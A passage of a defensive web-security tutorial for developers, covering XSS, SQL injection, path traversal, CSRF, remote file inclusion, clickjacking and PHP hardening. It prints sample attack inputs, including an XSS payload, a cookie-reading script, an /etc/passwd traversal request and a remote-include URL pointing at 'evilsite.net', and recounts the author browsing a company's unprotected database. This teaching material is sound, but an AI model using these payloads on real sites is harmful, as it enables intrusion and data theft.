name=&quot;oq&quot;/&gt;\n  &lt;input type=&quot;hidden&quot; name=&quot;aqi&quot;/&gt;\n&lt;/form&gt;</pre><p>So in essence, this form sends the content of all of these fields to the URI <code>search</code> and appends them to that URI. This is how you end up with this,</p><pre>http://www.google.com/search?hl=en&amp;source=hp&amp;q=puppies&amp;aq=f&amp;oq=&amp;aqi=</pre><p>when you submit the form. Notice, for instance, that I have no <code>btnG</code> parameter because I used the <em>Enter</em> key to submit the form.</p><p>On the search results page, you can see the pagination links at the bottom (the <em>1 2 3</em> and so on under the <em>Gooooooogle</em> logo), and you can see that these links send the same data to the URI and add a <code>start</code> parameter:</p><pre>&lt;a href=&quot;/search?hl=en&amp;amp;q=puppies&amp;amp;<strong>start=40</strong>&amp;amp;sa=N&quot;&gt;5&lt;/a&gt;</pre><p>You can send parameters to a script with the URI via form fields, links or any other thing in HTML that contains a URI: images, link elements, frames, anything that can take an <code>href</code> or <code>src</code> attribute. If an attacker can override any of these or add a new image to your HTML without you knowing it, they could point to their own URIs and send their own parameters.</p><p>You have to be careful with what your parameters contain and where they point to, which could be someone else’s server (to get more code) or sections of your own server that you don’t want to show or send to another server.</p><h3>Different Types Of Attacks. What Do These Words Mean?</h3><p>Let’s quickly go through the different items mentioned in the graph above, explaining what they are and what they mean.</p><h4>SQL Injection</h4><p>With an <a href=\"http://unixwiz.net/techtips/sql-injection.html\">SQL injection</a>, an attacker accesses your database by sending an SQL command to your server via the URI or form fields. This is easily worked around by <a href=\"http://en.wikipedia.org/wiki/SQL_injection\">sanitizing</a>, but neglecting to do so can be fatal for your website, as the following <a href=\"http://xkcd.com/327/\">XKCD comic</a> shows:</p><p><a href=\"http://xkcd.com/327/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/01/exploits_of_a_mom.png\" alt=\"Exploits Of A Mom in Web Security: Are You Part Of The Problem?\"></a><br><em><a href=\"http://xkcd.com/327/\">XKCD comic</a> showing how SQL injection would delete a database.</em></p><h4>Cross-Site Scripting (XSS)</h4><p>Cross-site scripting is probably the biggest and most common problem. With it, an attacker injects JavaScript code into your document by adding it to the end of the URI as a parameter or in a form field.</p><p>Say you want to be cool and allow visitors to customize certain colors on your page. You could do this easily in PHP:</p><pre>&lt;?php\n  // predefine colors to use\n  $color = &#39;white&#39;;\n  $background = &#39;black&#39;;\n  // if there is a parameter called color, use that one\n  if(isset($_GET[&#39;color&#39;])){\n    $color = $_GET[&#39;color&#39;];\n  }\n  // if there is a parameter called background, use that one\n  if(isset($_GET[&#39;background&#39;])){\n    $background = $_GET[&#39;background&#39;];\n  }\n?&gt;\n\n&lt;style type=&quot;text/css&quot; media=&quot;screen&quot;&gt;\n  #intro{\n    /* color is set by PHP */\n    color:&lt;?php echo $color;?&gt;;\n    /* background is set by PHP */\n    background:&lt;?php echo $background;?&gt;;\n    font-family:helvetica,arial,sans-serif;\n    font-size:200%;\n    padding:10px;\n  }\n&lt;/style&gt;\n\n&lt;p id=&quot;intro&quot;&gt;Cool intro block, customizable, too!&lt;/p&gt;</pre><p>So far, everything’s kosher, and we’re not even using inline styles! If you save this now as <em>test.php</em> and call it on your server in your browser as the URI <code>http://example.com/test.php</code>, you will get a text intro block that is black on white. The <code>$_GET[]</code> variables come from the URI as parameters, and because they are not set, nothing changes. If you want the colors to be red on pink, you can do this: <code>http://example.com/test.php?color=red&amp;background=pink</code>.</p><p>But because you allow any value for the variables, an attacker could send the following:</p><pre>http://example.com/test.php?color=green&amp;background=&lt;/style&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</pre><p>This would effectively close the style block prematurely and add a script to the document. In this case, all we would be doing is writing out the word XSS, but we could do anything that a JavaScript is allowed to do. You can see the results in the following screenshot:</p><p><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/01/4242086213_c3a9fae808_o.jpg\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/01/xss.jpg\" alt=\"Xss in Web Security: Are You Part Of The Problem?\" width=\"550\" height=\"368\"></a><br><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/01/4242086213_c3a9fae808_o.jpg\">Large view</a></p><p>Once you have successfully injected JavaScript, you will be able to read out cookies; open forms that ask the user to enter their passwords or credit card details; execute viruses, worms and “drive-by downloads”; the lot. The reason is that JavaScript is not bound by any security model; any script on the page has the same rights, no matter which server it has come from. This is a big security problem with JavaScript and is something clever people are working on.</p><p>XSS is a very common problem. Websites such as <a href=\"http://xssed.org/\">XSSED.org</a> have a field day showing the world just how many websites are vulnerable:</p><p><a href=\"http://xssed.org/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/01/xssed.jpg\" width=\"550\" height=\"389\" alt=\"Xssed in Web Security: Are You Part Of The Problem?\"></a></p><p>The remedy for XSS is to be very paranoid about anything that comes via forms or the URI. You also need to be sure that your PHP is set up properly (we’ll come back to some ways to test for that and to write good code later on).</p><h4>Path Traversal</h4><p>Allowing for path or directory traversal on your server is an amazingly bad idea. You would be allowing people to list the folders on your server and to navigate from folder to folder. This allows attackers to go to folders with sensitive information or website functionality and have some fun. The following screenshot is of me accessing the database of a sandwich company, sending emails from their server and reading the order logs:</p><p><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/01/menu-management.gif\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/01/path.jpg\" alt=\"Path in Web Security: Are You Part Of The Problem?\"></a><br><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/01/menu-management.gif\">Large view</a></p><p>I was able to get all of this information simply by accessing the <em>cgi-bin</em> folder, which was unprotected from being listed. So, instead of going to <code>http://example.com</code>, I went to <code>http://example.com/cgi-bin/</code> in my browser. I knew something was wrong on their big Flash website when I clicked on the menu. It popped up in a new window and had a URI like</p><pre>http://www.example.com/cgi/food_db/db.cgi?db=default&amp;uid=default&amp;Category=Sandwiches&amp;Subcategory=Sandwiches&amp;Product=Chicken%20and%20Bacon&amp;Soup_size=&amp;Drinks_milk_type=&amp;ww=on&amp;view_records=yes</pre><p>which gave me all the information I needed to play around.</p><p>The other problem of allowing folders to be listed is that search engines will index your information, allowing anyone to use Google as a hacking tool. As servers create a page with a title and a headline of the folder name, these are indexed by Google.</p><p>You could <a href=\"http://www.google.com/search?hl=en&amp;q=%22index+of+%2Febooks%22\">search for, say, “index of /ebooks”</a> to find electronic books online or <a href=\"http://www.google.com/search?hl=en&amp;q=%22index+of+%2Fphotos%22\">“index of /photos”</a> to find photos. To see search tests such as this one, check out the <a href=\"http://gray-world.net/etc/passwd/googletut1.txt\">Google a Dream Come True</a> article, which listed many of them in 2003(!).</p><p>This method of searching worked much better in the past, by the way: not because people protect their servers better now, but because spammers who offer fake pirated products realize that people do these searches and fake it now to optimize their own websites’ search engine rankings.</p><h4>Cross-Site Request Forgery</h4><p><a href=\"http://en.wikipedia.org/wiki/Csrf\">Cross-site request forgery</a> (CSRF) exploits browsers and websites that allow for functionality to be called without really knowing that an actual user initiated it. Say you have a form on your website <code>http://example.com</code> that works with GET and sends things to your database:</p><pre>&lt;form method=&quot;get&quot; action=&quot;add_to_db.php&quot;&gt;\n  &lt;div&gt;\n    &lt;label for=&quot;name&quot;&gt;Name&lt;/label&gt;\n    &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;name&quot;&gt;\n  &lt;/div&gt;\n  &lt;div&gt;\n    &lt;label for=&quot;email&quot;&gt;email&lt;/label&gt;\n    &lt;input type=&quot;text&quot; id=&quot;email&quot; name=&quot;email&quot;&gt;\n  &lt;/div&gt;\n  &lt;div&gt;\n    &lt;label for=&quot;comment&quot;&gt;Comment&lt;/label&gt;\n    &lt;textarea id=&quot;comment&quot; name=&quot;comment&quot;&gt;&lt;/textarea&gt;\n  &lt;/div&gt;\n  &lt;div&gt;&lt;input type=&quot;submit&quot; value=&quot;tell me more&quot;&gt;&lt;/div&gt;\n&lt;/form&gt;</pre><p>Forms can be sent by two methods: GET adds all of the parameters to the URI visibly in the address bar, whereas POST sends them “under the hood.” POST also allows you to send much more data. This is a simplification but all you need to know for now.</p><p>If the script that adds to the database doesn’t check that the form was really sent from your server, I could add an image to any website by doing this:</p><pre>&lt;img src=&quot;http://example.com/add_to_db.php?\nname=cheap%20rolex&amp;email=susan@hotchicks.com&amp;comment=mortgage%20help&quot; width=&quot;1&quot; height=&quot;1&quot;&gt;</pre><p>Anybody coming to my website would now be putting another comment into your database. I could use an image or CSS link or script or anything that allows for a URI to be defined and loaded by a browser when the HTML renders. In CSS, this could be a background image.</p><p>CSRF becomes even more dangerous when you are logged into and authenticated by a particular system. An image in any other tab in your browser could execute a money transfer, read your emails and send them on and many other evil things.</p><p>A really interesting case of CSRF (albeit an innocent one) occurred in 2006, when Google released its now discontinued <a href=\"http://webaccelerator.google.com/\">Web accelerator tool (GWA)</a>. The idea was to pre-fetch websites that were linked to from the current document, thus making surfing faster. All well and good… until you ended up with delete links in websites that worked like this:</p><pre>&lt;a href=&quot;/app/delete_entry.php?id=12&quot;&gt;delete&lt;/a&gt;</pre><p>Because some applications did not check if this was an initiated deletion or an attempt of GWA to pre-load the page, the tool deleted whole blogs and product databases. Google did nothing wrong, but the community learned a lot about CSRF that day.</p><p>Now, you might suppose that moving your forms from GET to POST would make them safe, right? Partially, yes, but an attacker could still use a form and trick people into clicking a button to make the request:</p><pre>&lt;form method=&quot;post&quot; action=&quot;add_to_db.php&quot;&gt;\n  &lt;div&gt;\n    &lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;bob&quot;&gt;\n    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;bob@experts.com&quot;&gt;\n    &lt;input type=&quot;hidden&quot; name=&quot;comment&quot;\n           value=&quot;awesome article, buy cialis now!&quot;&gt;\n  &lt;input type=&quot;submit&quot; value=&quot;see beautiful kittens now!&quot;&gt;\n  &lt;/div&gt;\n&lt;/form&gt;</pre><p>You could even use JavaScript to automatically send the form or a script on another server to do the POST request from the back-end. There are many ways to exploit CSRF, and <a href=\"http://php-ids.org/category/csrfx/\">protecting against it is not that hard</a>.</p><h4>Remote File Inclusion (RFI)</h4><p>With <a href=\"http://en.wikipedia.org/wiki/Remote_File_Inclusion\">Remote file inclusion</a> or <a href=\"http://en.wikipedia.org/wiki/Code_injection\">code injection</a>, an attacker uses a flaw in your website to inject code from another server to run on yours. It is in the same family as XSS but much more problematic because you have full access to your server (with JavaScript, you can steal cookies and call other code, but you can’t access the file system without resorting to tricks with Flash or Java Applets).</p><p>Any code injected to your server with an untested variable and <code>include()</code> command, for example, could run server commands: upload and download and transfer data to other servers, check your server passwords and user names, anything you can do on the command line via PHP or ASP if your server allows for it.</p><p>This is probably the worst that can happen to your server, because with command line access, I could turn it into an attack machine for a server network attack, silently listen to everything you and your users do on the server and send it to another Web resource, store information and viruses for distribution, inject spam links, you name it.</p><p>The workaround is to turn off <code>globals</code> and to never <em>ever</em> assemble a URI from parameter or form data. (More on that later in the PHP section of the tips.)</p><h4>Phishing</h4><p><a href=\"http://en.wikipedia.org/wiki/Phishing\">Phishing</a> is the technique of fooling people into entering information into a bad website. You show end users an interface that looks legit (for a bank or what have you) but that in reality sends their information to your database. Because phishing is a felony, I cannot show you a demo.</p><p>The trick with phishing is to make the form really look like it comes from a website you trust. You have probably gotten emails saying that your “XYZ bank account” has been compromised, and you know for certain that this isn’t the case because you have no account with that bank and may not have even heard of it. This is a wild-guess phishing attempt, which is not usually effective.</p><p>On the Web, though, an attacker can perform a JavaScript trick to find out where you’ve been. As <a href=\"http://jeremiahgrossman.blogspot.com/2006/08/i-know-where-youve-been.html\">Jeremiah Grossman showed some years ago</a>, you can use JavaScript to determine the state of a link on the page. Because the colors of visited and unvisited links are different, we can use this technique to figure which websites a user has been to and then display the appropriate logo above the form. <a href=\"http://www.debugtheweb.com/test/cssvisited.htm\">This demo shows this quite effectively</a>. Funny enough, you can also use this trick for good; for example, by <a href=\"http://www.azarask.in/blog/post/socialhistoryjs/\">showing people only the buttons of social media websites they use</a>.</p><h4>Clickjacking</h4><p><a href=\"http://en.wikipedia.org/wiki/Clickjacking\">Clickjacking</a> is a terribly clever way to use CSS and inline frames to trick users into clicking something without knowing it. Probably the most famous example of this was the “Don’t click me” exploit of Twitter a few months ago. All of a sudden, Twitter was full of messages pointing to a website with a button that read “Don’t click me”. Here is an examples for Jason Kottke’s stream:</p><p><a href=\"http://dsandler.org/wp/archives/2009/02/12/dontclick\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/01/dontclick.jpg\" width=\"453\" height=\"143\" alt=\"Dontclick in Web Security: Are You Part Of The Problem?\"></a><br><em><a href=\"http://dsandler.org/wp/archives/2009/02/12/dontclick\">Twitter’s “Don’t Click” prank, explained</a></em></p><p>Human nature being what it is, many people clicked the button, which seemingly did nothing. What it actually did, though, was put your Twitter home page on top of the button as a frame, with an opacity of 0 in the CSS. The update field was pre-set with the tweet pointing to the page. The following screenshot makes this obvious, with the opacity set here to 0.5:</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/01/clickjacking1.jpg\" width=\"609\" height=\"308\" alt=\"Clickjacking1 in Web Security: Are You Part Of The Problem?\"></p><p>By clickjacking, you can make end users do things without knowing it. Every action on a website that can be performed with a simple click can be exploited with this trick.</p><p>Clickjacking is a massive problem because it is done via CSS, not a script. Unless browsers block frames from having an opacity of 0, there is no simple workaround. The main counter-measure people take is to disallow embedding in frames using JavaScript. However, with JavaScript off, clickjacking still works.</p><h3>Basic Ways To Increase Web Security</h3><p>Now that you know a bit about what can be done to your website by the bad guys, here are some ways to fight them off.</p><h4>Keep Code Up to Date</h4><p>There is no better protection than keeping your code up to date. Outdated versions of WordPress, old installs of PHP and MySQL, even old browsers, all of these are security issues because most updates to software these days are security patches. It is a rat race between those who want the Web to work and those who want to abuse it to make a quick buck or to steal your identity. So please help the good guys by upgrading whenever a new version is out.</p><h4>Don’t Stay Logged In, and Don’t Entice Others to Either</h4><p>Staying logged in while not using a system is dangerous. Other websites you surf to can check that you are logged in and then clickjack you to make you do something you don’t mean to or aren’t aware of. This is especially dangerous with social media because everything you do will be sent to all your friends and probably replicated by them. It is a snowball effect.</p><p>In my perfect world, no form has a “Keep me logged in” option, which of course would be a nuisance to end users. I would love to see a clever, usable solution to this problem. I use a Flex client for Twitter, not a browser, which means I am not vulnerable even on websites with clickjacking and cross-site request forgery (the latter only if people do not abuse the API to phish my followers; see the presentations at the end of this article for a demo of that).</p><h4>Use Clever Passwords, and Entice Users to Do the Same</h4><p>Even on bullet-proof systems, one attack vector is users whose passwords are very easy to guess. I change my passwords every few weeks, and I take inspiration from a book I am reading or a movie I have just seen. I also replace some characters and with numbers to make dictionary attacks harder.</p><p>There are <strong>two ways to crack a password</strong> (other than social engineering, which is making you tell me your password by tricking you or phishing): brute force and dictionary attacks. Brute force entails writing a loop that tries all of the different options (much like playing hangman), which can take ages and uses a lot of computing power. Dictionary attacks use a dictionary database to attempt common words instead of going letter by letter.</p><p>Say I am reading a Sherlock Holmes book or have just seen the new screen adaptation, my password could be <code>Sh3rl0ckW4t50n</code> or <code>b4sk3rv!ll3</code>. That may be a bit hardcore for most people but is generally a good idea. Another strategy is to take a sentence that you can memorize easily and string together the initial letters. For example, “I like to buy food for my dog and to walk with it” would be <code>Il2bffmda2wwi</code> or even <code>Il2bffmd&amp;2wwi</code>.</p><p>So, if you build a new Web product that needs authentication, and you really need to build your own log-in system rather than use Google, Yahoo, Facebook Connect or OpenID (which might be a good idea), please do not allow users to use passwords like “password” or the not-much-safer “password1.” Recently, a <a href=\"http://www.gaj-it.com/14253/twitter-bans-370-passwords-too-easy-to-hack\">list of passwords banned by Twitter</a> leaked onto the Web, <a href=\"http://sharetext.org/BEM\">shown here as the full code</a>. This is a good idea (the list, that is, not the leak).</p><h3>What To Do On Your Server</h3><p>Even if you are not a server expert, that’s no excuse for running an insecure server. Here are some things to make sure of.</p><h4>Turn Off Folder Listing</h4><p>As explained earlier, allowing people to navigate your folders (i.e. path traversal) is a bad idea. Testing whether your server has path traversal turned on is easy:</p><ol><li>Create a new folder on the server; for example, <em>pathtest</em>.</li><li>Add some files to the folder. But do not add <em>index.html</em>, <em>index.php</em>, <em>default.aspx</em> or whatever else your server uses as the default file name.</li><li>Check the folder in your browser; for example, by going to <code>http://example.com/pathtest/</code></li><li>If you can see a listing, contact your server admin to turn that off!</li></ol><h4>Harden Your PHP</h4><p>If you have a server with PHP, be aware that you are in control of a powerful tool. The worst oversight someone could make is to allow any parameter that comes in from the URI to become a global variable. This is turned off by default on PHP installs in version 4.2.0 and onward, but your configuration may have changed. In fact, some tutorials recommend that you turn it on for a script to work: this is a very, very bad idea.</p><p>You can easily test if globals are enabled:</p><ol><li>Create a new file named <em>test.php</em>.</li><li>Add the following code to it:<pre>&lt;?php echo &quot;*&quot;.$ouch.&#39;*&#39;;?&gt;</pre></li><li>Upload the file to your server.</li><li>Browse to the file, and send a parameter called ouch; for example: <code>http://example.com/test.php?ouch=that+hurts</code></li><li>If your browser shows “*that hurts*”, then your server has globals registered.</li><li>Contact your server admin to get this fixed!</li></ol><p>Why is this important? Well, in our explanation of XSS earlier, we talked about attackers being able to add code to your page using the URI parameters in your script. If you don’t turn off globals, any variable you use and write out could become an attack. Even worse, consider the following code:</p><pre>\nif($_POST[&#39;username&#39;] == &#39;muppet&#39; &amp;&amp;\n   $_POST[&#39;password&#39;] == &#39;password1&#39;) {\n    $authenticated = true;\n}\nif($authenticated) {\n  // do something only admins are allowed to do\n}\n</pre><p>If this is <em>checkuser.php</em> and global registering is on, then an attacker could call this in the browser as <code>http://example.com/checkuser.php?authenticated=true</code> and could work around the whole user checking; his authentication as <code>$_GET['authenticated']</code> automatically turns into <code>$authenticated</code>.</p><h4>Turn Off Error Messages</h4><p>A lot of servers are set up to show you error messages when the browser encounters a problem. These messages often look cryptic, but they are a great source of information for attackers.</p><p>Creating an error and seeing what the server spits out is one of the first steps in checking the folder structure of a server. Funnily enough, error pages stating “File XYZ could not be found” were one of the first XSS attack opportunities, because you could look for a file named <code>&lt;script&gt;alert(document.cookie),&lt;/script&gt;</code>.</p><h4>Automatically Checking PHP for Security Issues</h4><p>Uploading <a href=\"http://phpsec.org/projects/phpsecinfo/\">PHPSecInfo</a> to a folder is a pretty handy way to perform a quick audit of your PHP server’s security. Opening it in your browser gives you a detailed checklist of common security flaws and how they should be fixed.</p><p>But <strong>never leave this on a live server</strong> because it gives attackers a lot of details about your set-up!</p><p><a href=\"http://phpsec.org/projects/phpsecinfo/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/01/securityinfo.gif\" alt=\"Securityinfo in Web Security: Are You Part Of The Problem?\" width=\"550\" height=\"499\"></a><br><em>PHPSecInfo gives you detailed security information about your PHP setup.</em></p><h3>What To Do To Your Code</h3><p>Because you likely do not have much to do with your server let’s focus on things you do have full control of.</p><h4>HTML</h4><p>HTML is pretty safe. It is simply converted into text—no interaction with the server or calculations—so not much can go wrong. That said, you should always use HTML for what it’s for:</p><ul><li><strong>HTML structures your content.</strong><br> HTML is not a database to store information. The reason it is not is because you cannot rely on HTML content to stay unchanged. Anyone could use browser debugging tools to mess around with your HTML and change the content. So you run into security issues with JavaScript solutions that rely on data in the HTML and don’t check the server for what that data is allowed to be.</li><li><strong>HTML is fully visible.</strong><br> Don’t use comments in the HTML to store sensitive information, and don’t comment out sections of a page that are not ready yet but that point to parts of an application that are in progress.</li><li><strong>Hiding things doesn’t make them go away.</strong><br> Even if you hide information with CSS or JavaScript, some people can get it anyway. HTML is not there to give your application functionality; that should always happen on the server.</li></ul><p>A wonderful example of insecure HTML was the drop-down menu on the website of a certain airline. This menu let you define the seating class you wanted to fly in as the last step before printing your voucher. The website rendered the HTML of the drop-down menu and commented out the sections that were not available for the price you had selected:</p><pre>&lt;select name=&quot;class&quot;&gt;\n  &lt;option value=&quot;ec&quot;&gt;Economy&lt;/option&gt;\n  &lt;option value=&quot;ecp&quot;&gt;Economy Plus&lt;/option&gt;\n  &lt;!--\n  &lt;option value=&quot;bu&quot;&gt;Business&lt;/option&gt;\n  &lt;option value=&quot;fi&quot;&gt;First&lt;/option&gt;\n  --&gt;\n&lt;/select&gt;</pre><p>The server-side code did not check to see whether you were eligible for a first-class ticket; it simply relied on the option not being available. The form was then sent via JavaScript. So, all you had to do to get a first-class ticket for the price of an economy seat was use <a href=\"http://getfirebug.com\">FireBug</a> to add a new option to the form, select the value you wanted and send it off.</p><h4>CSS</h4><p>CSS is not really capable of doing much to the document and cannot access the server… for now. One problem with CSS is background images that point to URIs. You can inject code by somehow overriding these. The same applies to the <code>@import</code> property for other style sheets.</p><p>Using <code>expression()</code> in Internet Explorer to make calculations (or, as in most cases, to simulate what other browsers can already do) is dangerous, though, because what you are doing in essence is executing JavaScript inside a CSS block. So, don’t use it.</p><p>CSS changing a lot now, and we are giving it more power than ever before. Generating content with CSS, animation, calculations and font embedding all sound absolutely cool, but I get a prickly feeling in the back of my neck when I look at it right now.</p><p>Attack vectors have two features: they have the power to change the content of a document, and they are technologies that are not proven and are changing constantly. This is what CSS 3 is right now. Font-embedding in particular could become a big security issue, because fonts are binary data that could contain anything: harmless characters as well as viruses masquerading as a nice charset. It will be interesting to see how this develops.</p><h4>JavaScript</h4><p>JavaScript makes the Web what it is today. You can use it to build interfaces that are fun to use and that allow visitors to reach their goals fast and conveniently. You can and should use JavaScript for the following:</p><ul><li>Create slicker interfaces (e.g. auto-complete, asynchronous uploading).</li><li>Warn users about flawed entries (password strength, for instance).</li><li>Extend the interface options of HTML to become an application language (sliders, maps, combo boxes, etc.)</li><li>Create visual effects that cannot be done safely with CSS (animation, menus, etc.)</li></ul><p>JavaScript is very powerful, though, which also means that it is a security issue:</p><ul><li>JavaScript gives you full access to the document and allows you to post data to the Internet.</li><li>You can read cookies and send them elsewhere.</li><li>JavaScript is also fully readable by anyone using a browser.</li><li>Any JavaScript on the page has the same rights as the others, regardless of where it came from. If you can inject a script via XSS, it can do and access whatever the other scripts can.</li></ul><p>This means you should not try to do any of the following in JavaScript:</p><ul><li>Store sensitive information (e.g. credit card numbers, any real user data).</li><li>Store cookies containing session data.</li><li>Try to protect content (e.g. right-click scripts, email obfuscation).</li><li>Replace your server or save on server traffic without a fallback.</li><li>Rely on JavaScript as the only means of validation. Attackers can turn off JavaScript and get full access to your system.</li><li>Trust any JavaScript that does not come from your server or a similar trusted source.</li><li>Trust anything that comes from the URI, HTML or form fields. All of these can be manipulated by attackers after the page has loaded. If you use <code>document.write()</code> on unfiltered data, you expose yourself to XSS attacks.</li></ul><p>In other words, AJAX is fun, but do not rely on its security. Whatever you do in JavaScript can be monitored and logged by an end user with the right tools.</p><h4>PHP (or Any Server-Side Language)</h4><p><strong>Here be dragons!</strong> The server-side language is where you can really mess up if you don’t know what you’re doing. The biggest problems are trusting information from the URI or user entry and printing it out in the page. As shown earlier in the XSS example with the colors, you will be making it easy to inject malicious code into your page.</p><p>There are two ways to deal with this: whitelisting and proper filtering.</p><p>Whitelisting is the most effective way to make sure nothing insecure gets written out. The trick is easy: don’t use information that gets sent through as the output; rather, just use it in conditions or as lookups.</p><p>Let’s say you want to add a file on demand to a page. You currently have these sections on the page: About Us, Contact, Clients, Portfolio, Home, Partners. You could store the data of these in <em>about-us.php</em>, <em>contact.php</em>, <em>clients.php</em>, <em>portfolio.php</em>, <em>index.php</em> and <em>partners.php</em>.</p><p>The <strong>amazingly bad way to do this</strong> is probably the way you see done in many tutorials: a file called something like <em>template.php</em>, which takes a <code>page</code> parameter with the file name.</p><p>The template then normally contains something like this:</p><pre>&lt;?php include($_GET[&#39;page&#39;]);?&gt;</pre><p>If you call <code>http://example.com/template.php?page=about-us.php</code>, this would load the “About Us” document and include it in the template where the code is located.</p><p>It would also allow someone to check out all of the other interesting things on your server. For example, <code>http://example.com/template.php?page=../../../../../../../../etc/passwd%00</code> or the like would allow an attacker to read your <code>passwd</code> file.</p><p>If your server allows for remote files with <code>include()</code>, you could also inject a file from another server, like <code>http://example.com/template.php?page=http://evilsite.net/exploitcode/2.txt?</code>. Remember, these text files will be executed as PHP inside your other PHP file and thus have access to everything. A lot of them contain mass-mailers or check your system for free space and upload options to store data.</p><p>In short: <strong>never, ever allow an unfiltered URI parameter to become part of a URI that you load in PHP or print out as an <code>href</code> or <code>src</code> in the HTML</strong>. Instead, use pointers:</p><pre>&lt;?php\n$sites = array(\n  &#39;about&#39;=&gt;&#39;about-us.php&#39;,\n  &#39;contact&#39;=&gt;&#39;contact.php&#39;,\n  &#39;clients&#39;=&gt;&#39;clients.php&#39;,\n  &#39;portfolio&#39;=&gt;&#39;portfolio.php&#39;,\n  &#39;home&#39;=&gt;&#39;index.php&#39;,\n  &#39;partners&#39;=&gt;&#39;partners.php&#39;\n);\nif( isset($_GET[&#39;page&#39;]) &amp;&amp;\n    isset($sites[$_GET[&#39;page&#39;]]) &amp;&amp;\n    file_exists($sites[$_GET[&#39;page&#39;]]) ){\n      include($sites[$_GET[&#39;page&#39;]]);\n} else {\n  echo &#39;This page does not exist on this system.&#39;;\n}\n?&gt;</pre><p>This way, the parameters become not a file name but a word. So, <code>http://example.com/template.php?page=about</code> would include <code>about-us.php</code>, <code>http://example.com/template.php?page=home</code> would include <code>index.php</code> and so on. All other requests would trigger the error message. Note that the error message is in our control and not from the server; or else you might display information that could be used for an exploit.</p><p>Also, notice how defensive the script is. It checks if a <code>page</code> parameter has been sent; then it checks if an entry for this value exists in the <code>sites</code> array; then it checks if the file exist; and then, and only then, it includes it. Good code does that… which also means it can be a bit bigger than expected. That’s not exactly “Build your own PHP templating system in 20 lines of code!” But it’s much better for the Web as a whole.</p><p>Generally, defining all of the variables you will use before you use them is a good idea. This makes it safer even in PHP set-ups that have globals registered. The following cannot be cracked by calling the script with an <code>authenticated</code> parameter:</p><pre>\n$authenticated = false;\nif($_POST[&#39;username&#39;] == &#39;muppet&#39; &amp;&amp;\n   $_POST[&#39;password&#39;] == &#39;password1&#39;) {\n    $authenticated = true;\n}\nif($authenticated) {\n  // do something only admins are allowed to do\n}\n</pre><p>The demo we showed earlier makes it possible to work around this, because <code>$authenticated</code> was not pre-set anywhere.</p><p>Writing your own validator function is another option. For example, the color demo could be made secure by allowing only single words and numbers for the colors.</p><pre>$color = &#39;white&#39;;\n$background = &#39;black&#39;;\nif(isset($_GET[&#39;color&#39;]) &amp;&amp; isvalid($_GET[&#39;color&#39;])){\n  $color = $_GET[&#39;color&#39;];\n  if(ishexcolor($color)){\n    $color = &#39;#&#39;.$color;\n  }\n}\nif(isset($_GET[&#39;background&#39;]) &amp;&amp; isvalid($_GET[&#39;background&#39;])){\n  $background = $_GET[&#39;background&#39;];\n  if(ishexcolor($background)){\n    $background = &#39;#&#39;.$background;\n  }\n}\nfunction isvalid($col){\n  // only allow for values that contain a to z or 0 to 9\n  return preg_match(&#39;/^[a-z0-9]+$/&#39;,$col);\n}\nfunction ishexcolor($col){\n  // checks if the string is 3 or 6 characters\n  if(strlen($col)==3 || strlen($col)==6){\n    // checks if the string only contains a to f or 0 to 9\n    return preg_match(&#39;/^[a-f0-9]+$/&#39;,$col);\n  }\n}</pre><p>This allows for <code>http://example.com/test.php?color=red&amp;background=pink</code> or <code>http://example.com/test.php?color=369&amp;background=69c</code> or <code>http://example.com/test.php?color=fc6&amp;background=449933</code>, but not for <code>http://example.com/test.php?color=333&amp;background=&amp;lt/style&gt;</code>. This keeps it flexible for the end user but still safe to use.</p><p>If you are dealing with content that cannot be easily whitelisted, then you’ll need to filter out all the malicious code that someone could inject. This is quite the rat-race because new browser quirks are being found all the time that allow an attacker to execute code.</p><p>The most basic way to deal with this is to use the <a href=\"http://us2.php.net/manual/en/book.filter.php\">native PHP filters on anything that comes in</a>. But a quite sophisticated package called <a href=\"http://htmlpurifier.org/\">HTML Purifier</a> is also available.</p><h3>Housekeeping</h3><p>One very important part of security is keeping your server clean. If you have old, insecure code lying around, it won’t matter whether your main website is hardened and up to date with the best security measures. Your server is as vulnerable as its weakest and least-maintained code.</p><p>Check what you have on your server from time to time, and delete or move things that you are not interested in any more or couldn’t be bothered to maintain. Instead of deleting code, you could move it to a repository such as <a href=\"http://code.google.com\">Google Code</a> or <a href=\"http://github.com\">GitHub</a> and redirect the old folder to it.</p><p>It is also not a good idea to use the same server to test things and run a live product. Use one server as a test platform for playing around and another for grown-up stuff. It is especially important to have a different domain for each to protect your cookies.</p><h3>Check Your Log Files</h3><p>Every server comes with log files that you can access. Many hosting companies even give you detailed statistics that show you where visitors have gone and what they did.</p><p>Normally, we just use these to check the number of visitors, what browsers they used, where they came from, when they came and which websites were most successful. This is what makes us happy and allows us to track our progress.</p><p>That is not really the interesting part of the statistics package or log files, though:</p><ul><li>Check how many forms have been sent and who tried to send them. This is an indicator of CSRF and XSS attacks.</li><li>Check the server traffic and which files were frequently called. If the forms are old and not frequently used, you have a CSRF attack on your hands.</li><li>Search the logs for “txt?” endings, which are an indicator of RFI attacks. Try them out on your website; if they work, alarm bells should go off in your head. An exception to this is <em>robots.txt</em>, which is a file that search engines request before reading a folder; this is not an issue and wouldn’t be followed by a question mark anyway.</li><li>Check the error messages and how many of them were 404 errors (”Page not found”). Check what file names people were looking for, which folders they attempted to access and what files they tried to read.</li><li>Check which users tried to authenticate. If a user you don’t know was causing a lot of traffic, they already got control of your server.</li></ul><p>Your log file is your snitch that tells on the bad guys who come around trying to mess with your server. Be wise and stay a step ahead of them.</p><h3>Want To Know More?</h3><p>If you want to know more about the subject, here are some presentations and resources.

